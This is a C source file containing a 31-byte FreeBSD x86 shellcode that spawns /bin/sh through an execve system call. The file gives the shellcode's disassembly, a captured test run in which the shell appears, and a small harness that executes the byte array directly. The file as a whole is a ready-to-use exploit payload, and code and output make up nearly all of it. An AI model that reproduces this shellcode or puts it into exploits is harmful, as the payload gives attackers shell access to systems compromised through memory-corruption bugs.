#include <stdio.h>

/*
0804846c <main>:
 804846c:       31 d2                   xor    %edx,%edx
 804846e:       52                      push   %edx
 804846f:       68 2f 2f 73 68          push   $0x68732f2f
 8048474:       68 2f 62 69 6e          push   $0x6e69622f
 8048479:       52                      push   %edx
 804847a:       8d 5c 24 04             lea    0x4(%esp,1),%ebx
 804847e:       52                      push   %edx
 804847f:       53                      push   %ebx
 8048480:       8d 0c 24                lea    (%esp,1),%ecx
 8048483:       52                      push   %edx
 8048484:       51                      push   %ecx
 8048485:       53                      push   %ebx
 8048486:       52                      push   %edx
 8048487:       b8 3b 00 00 00          mov    $0x3b,%eax
 804848c:       cd 80                   int    $0x80

 -- Release
~/tmp/freebsd-shellcode> cc -o shell shell.c
~/tmp/freebsd-shellcode> ./shell
31 bytes code.
$ ps
  PID  TT  STAT      TIME COMMAND
  35306  p0  Ss     0:02.97 -bash (bash)
  43199  p0  S      0:00.01 /bin//sh
  43200  p0  R+     0:00.00 ps
$
  
*/
char h3llc0de[] = 
        "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x52\x8d\x5c\x24\x04\x52\x53"
        "\x8d\x0c\x24\x52\x51\x53\x52\xb0\x3b\xcd\x80";

int main(void)
{
        void(*func)();
        
        func = (void*)h3llc0de;
        fprintf(stdout, "%d bytes code.\n", strlen(h3llc0de));
        func();
        return 0;
}

/*
* vim600: sw=4 ts=4 bg=dark
*/
